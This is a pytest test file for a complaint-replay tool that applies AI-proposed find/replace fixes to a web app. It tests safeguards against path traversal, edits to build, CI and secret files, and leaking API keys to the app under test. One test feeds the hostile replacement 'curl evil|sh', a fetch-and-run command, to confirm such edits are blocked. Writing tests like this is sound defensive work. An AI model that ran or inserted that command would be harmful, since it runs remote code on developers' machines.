from pathlib import Path

import pytest

from replay.fix import Patch, apply_patch


def make_shop(tmp_path: Path) -> Path:
    (tmp_path / "static").mkdir(parents=True)
    (tmp_path / "static" / "config.js").write_text("OTP_TIMEOUT_MS: 4000,\n", encoding="utf-8")
    return tmp_path


def test_applies_edit_and_returns_diff(tmp_path: Path) -> None:
    shop = make_shop(tmp_path)
    diff = apply_patch(Patch("x", ({"file": "static/config.js", "find": "4000", "replace": "30000"},)), shop)
    assert (shop / "static" / "config.js").read_text(encoding="utf-8") == "OTP_TIMEOUT_MS: 30000,\n"
    assert "+OTP_TIMEOUT_MS: 30000," in diff


def test_rejects_paths_outside_the_app(tmp_path: Path) -> None:
    shop = make_shop(tmp_path / "shop")
    with pytest.raises(ValueError):
        apply_patch(Patch("x", ({"file": "../evil.py", "find": "a", "replace": "b"},)), shop)


def test_bad_edit_changes_nothing(tmp_path: Path) -> None:
    shop = make_shop(tmp_path)
    edits = ({"file": "static/config.js", "find": "4000", "replace": "30000"},
             {"file": "static/config.js", "find": "not there", "replace": "x"})
    with pytest.raises(ValueError):
        apply_patch(Patch("x", edits), shop)
    assert "4000" in (shop / "static" / "config.js").read_text(encoding="utf-8")


def test_patch_keeps_windows_line_endings(tmp_path) -> None:
    (tmp_path / "a.js").write_bytes(b"const a = 1;\r\nconst b = 2;\r\n")
    apply_patch(Patch("x", ({"file": "a.js", "find": "const a = 1;\nconst b = 2;", "replace": "const a = 3;\nconst b = 2;"},)), tmp_path)
    assert (tmp_path / "a.js").read_bytes() == b"const a = 3;\r\nconst b = 2;\r\n"


def test_patch_refuses_files_outside_the_allowed_paths(tmp_path) -> None:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "a.js").write_text("x = 1", encoding="utf-8")
    (tmp_path / "server.js").write_text("y = 1", encoding="utf-8")
    apply_patch(Patch("x", ({"file": "src/a.js", "find": "x = 1", "replace": "x = 2"},)), tmp_path, ("src/*",))
    with pytest.raises(ValueError, match="not in the files"):
        apply_patch(Patch("x", ({"file": "server.js", "find": "y = 1", "replace": "y = 2"},)), tmp_path, ("src/*",))


def test_big_repo_sends_the_files_that_match_the_evidence(tmp_path) -> None:
    from replay import sources

    for i in range(30):
        (tmp_path / f"component{i}.js").write_text(f"export const c{i} = 'filler';\n" * 50, encoding="utf-8")
    (tmp_path / "Checkout.jsx").write_text("<button className='pay-btn'>Pay now</button>\n" + "// x\n" * 50, encoding="utf-8")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "lib.js").write_text("Pay now", encoding="utf-8")
    hints = ["'Pay now' is outside the screen (left=400px, screen=360px)"]
    picked = sources.pick(tmp_path, hints, budget=3000)
    assert picked[0] == "Checkout.jsx" and "node_modules/lib.js" not in picked
    assert sources.pick(tmp_path, hints, budget=10**7)[0] == "Checkout.jsx"  # small enough: everything goes


def test_triage_picks_the_nearest_class_and_skips_only_clear_non_bugs() -> None:
    from replay.triage import classify, fit

    centroids = fit([[1, 0], [0.9, 0.1], [0, 1]], ["bug", "bug", "spam"])
    assert classify([0.95, 0.05], centroids)["label"] == "bug" and classify([0.95, 0.05], centroids)["replay"]
    spam = classify([0.05, 1], centroids)
    assert spam["label"] == "spam" and not spam["replay"]


@pytest.mark.parametrize("name", ["complaint-replay.toml", ".github/workflows/ci.yml", "package.json", "run.sh", ".env",
                                  "src/Table.test.tsx", "src/__tests__/a.ts", ".complaint-replay/guards/g.json"])
def test_a_fix_can_never_touch_build_or_secret_files(tmp_path, name) -> None:
    (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
    (tmp_path / name).write_text("start = 'npm run dev'", encoding="utf-8")
    with pytest.raises(ValueError, match="builds or secrets"):
        apply_patch(Patch("x", ({"file": name, "find": "npm run dev", "replace": "curl evil|sh"},)), tmp_path)


def test_the_app_under_test_gets_no_secrets(monkeypatch) -> None:
    from replay.project import app_env

    monkeypatch.setenv("NEBIUS_API_KEY", "k")
    monkeypatch.setenv("GH_TOKEN", "t")
    monkeypatch.setenv("NODE_ENV", "development")
    env = app_env()
    assert "NEBIUS_API_KEY" not in env and "GH_TOKEN" not in env and env["NODE_ENV"] == "development"
    assert env["BROWSER"] == "none"  # dev servers must not open tabs in the developer's own browser


def test_picker_finds_a_shared_component_from_the_element_kind(tmp_path) -> None:
    from replay import sources

    for i in range(30):
        (tmp_path / f"filler{i}.tsx").write_text(f"export const f{i} = 'filler';\n" * 50, encoding="utf-8")
    (tmp_path / "mobile").mkdir()
    (tmp_path / "mobile" / "forms" ).mkdir()
    (tmp_path / "mobile" / "forms" / "Fields.tsx").write_text("export function InputField() {}\n" + "// x\n" * 50,
                                                              encoding="utf-8")
    (tmp_path / "mobile" / "Edit.tsx").write_text(
        "import { InputField } from './forms/Fields';\n<InputField type=\"date\" />\n", encoding="utf-8")
    hints = ["'2026-10-16' (<input type=\"date\" name=\"date\">) could not be tapped"]
    picked = sources.pick(tmp_path, hints, budget=2000)
    assert "mobile/Edit.tsx" in picked and "mobile/forms/Fields.tsx" in picked


def test_picker_follows_alias_imports(tmp_path) -> None:
    from replay.sources import local_imports

    texts = {"src/a/Edit.tsx": "import { X } from '#components/mobile/Forms';\nimport React from 'react';",
             "src/components/mobile/Forms.tsx": "", "src/other/Forms.tsx": ""}
    assert local_imports("src/a/Edit.tsx", texts) == ["src/components/mobile/Forms.tsx"]


def test_patch_tolerates_changed_indentation_but_not_ambiguity(tmp_path) -> None:
    (tmp_path / "Field.tsx").write_text("function F() {\n    return (\n        <input type={type} />\n    );\n}\n",
                                        encoding="utf-8")
    edit = {"file": "Field.tsx", "find": "return (\n  <input type={type} />", "replace": "return (\n  <input type={type} onClick={open} />"}
    assert "onClick={open}" in apply_patch(Patch("", (edit,)), tmp_path)
    (tmp_path / "Two.tsx").write_text("a  b\na b\n", encoding="utf-8")
    with pytest.raises(ValueError):
        apply_patch(Patch("", ({"file": "Two.tsx", "find": "a   b", "replace": "c"},)), tmp_path)


def test_a_missed_find_text_shows_the_closest_real_text(tmp_path) -> None:
    (tmp_path / "Edit.tsx").write_text("<input\n  style={{\n    appearance: 'none',\n  }}\n/>\n", encoding="utf-8")
    with pytest.raises(ValueError) as e:
        apply_patch(Patch("", ({"file": "Edit.tsx", "find": "style={{\n    appearance: 'auto',\n  }}", "replace": "x"},)),
                    tmp_path)
    assert "closest text in the file is" in str(e.value) and "style={{" in str(e.value)


def test_a_find_that_dropped_jsx_double_braces_still_applies(tmp_path: Path) -> None:
    # Cloud case 9071 (run 16): three attempts wrote style={ ... } for style={{ ... }}, the fix never applied.
    (tmp_path / "Edit.tsx").write_text("<input\n  style={{\n    minWidth: '150px',\n    appearance: 'none',\n  }}\n/>\n",
                                       encoding="utf-8")
    find = "style={\n    minWidth: '150px',\n    appearance: 'none',\n  }"
    replace = "style={\n    minWidth: '150px',\n  }"
    apply_patch(Patch("x", ({"file": "Edit.tsx", "find": find, "replace": replace},)), tmp_path)
    assert (tmp_path / "Edit.tsx").read_text(encoding="utf-8") == "<input\n  style={{\n    minWidth: '150px',\n  }}\n/>\n"


def test_a_fixer_that_ran_out_of_tokens_says_so(tmp_path: Path, monkeypatch) -> None:
    # Actual case 8926: reasoning used every token and the reply was empty; "no JSON" hid the real reason.
    import asyncio
    from types import SimpleNamespace

    import replay.fix as fix
    from replay.agent import ReplayResult
    from replay.conditions import CONDITIONS

    async def no_wait() -> None:
        return None

    class Client:
        class chat:
            class completions:
                @staticmethod
                async def create(**kwargs):
                    return SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(content=""),
                                                                    finish_reason="length")])

    monkeypatch.setattr(fix, "throttle", no_wait)
    shop = make_shop(tmp_path)
    result = ReplayResult("reproduced", "x", (), (), ())
    with pytest.raises(ValueError, match="ran out of tokens"):
        asyncio.run(fix.propose_fix(Client(), "m", "OTP never comes", CONDITIONS["fast_desktop"], result, shop))
